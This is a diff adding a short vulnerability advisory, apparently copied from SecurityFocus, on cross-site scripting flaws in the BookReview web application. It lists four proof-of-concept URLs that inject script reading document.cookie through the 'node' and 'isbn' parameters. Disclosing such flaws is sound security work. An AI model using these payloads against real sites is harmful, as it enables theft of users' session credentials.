@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/13783/info
+
+BookReview is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/add_review.htm?isbn=0801052319&node=%3Cscript%3Ealert(document.cookie)%3C/script%3E&review=true
+http://www.example.com/add_review.htm?isbn=0801052319%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&node=Political_Science&review=true
+http://www.example.com/add_review.htm?isbn=0553278223&node="><script>alert(document.cookie)</script>&review=true
+http://www.example.com/add_review.htm?node=index&isbn=\\"><script>alert(document.cookie)</script>
